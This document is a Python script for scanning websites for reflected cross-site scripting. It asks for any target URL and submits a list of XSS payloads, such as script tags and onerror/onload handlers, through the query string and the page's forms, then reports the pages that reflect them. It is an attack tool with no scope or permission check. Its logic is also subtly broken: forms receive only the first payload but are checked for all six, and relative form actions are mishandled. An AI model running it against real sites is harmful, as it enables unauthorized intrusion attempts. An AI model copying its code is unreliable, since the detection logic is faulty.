import requests
from bs4 import BeautifulSoup

# Define XSS payloads
test_payloads = [
    "<script>alert('XSS')</script>",
    "<img src=x onerror=alert(1)>",
    "'><script>alert('XSS')</script>",
    "<svg/onload=alert(1)>",
    "<iframe src=javascript:alert(1)>",
    "<body onload=alert(1)>"
]

# Function to check if payload is reflected in the response
def check_xss(payload, response):
    if payload in response.text:
        return True
    return False

# Function to find all form inputs on a page
def get_form_inputs(url):
    response = requests.get(url)
    soup = BeautifulSoup(response.text, "html.parser")
    forms = soup.find_all("form")
    form_details = []

    for form in forms:
        action = form.attrs.get("action")
        method = form.attrs.get("method", "get").lower()
        inputs = form.find_all("input")
        form_details.append({
            "action": action,
            "method": method,
            "inputs": inputs
        })
    return form_details

# Function to test forms for XSS
def test_forms_for_xss(url, payloads):
    forms = get_form_inputs(url)
    vulnerable_forms = []

    for form in forms:
        action = form["action"]
        method = form["method"]
        inputs = form["inputs"]

        form_url = url if action.startswith("/") else action
        data = {inp.attrs.get("name", "test"): payloads[0] for inp in inputs}

        if method == "post":
            response = requests.post(form_url, data=data)
        else:
            response = requests.get(form_url, params=data)

        for payload in payloads:
            if check_xss(payload, response):
                vulnerable_forms.append((form_url, payload))

    return vulnerable_forms

# Main function to execute tests
def main():
    # Prompt user for target URL
    target_url = input("Enter the target URL: ").strip()

    print(f"Testing target: {target_url}")
    vulnerable = []

    # Test the target URL directly with payloads
    for payload in test_payloads:
        response = requests.get(target_url + f"?test={payload}")
        if check_xss(payload, response):
            print(f"[+] XSS found on {target_url} with payload: {payload}")
            vulnerable.append((target_url, payload))

    # Test forms on the target URL
    print("\nTesting forms on the target URL...\n")
    vulnerable_forms = test_forms_for_xss(target_url, test_payloads)
    for vf in vulnerable_forms:
        print(f"[+] XSS found in form at {vf[0]} with payload: {vf[1]}")
        vulnerable.append(vf)

    if not vulnerable:
        print("[-] No XSS vulnerabilities found.")
    else:
        print("\nSummary of XSS Vulnerabilities:")
        for v in vulnerable:
            print(f"Target: {v[0]}, Payload: {v[1]}")

if __name__ == "__main__":
    main()
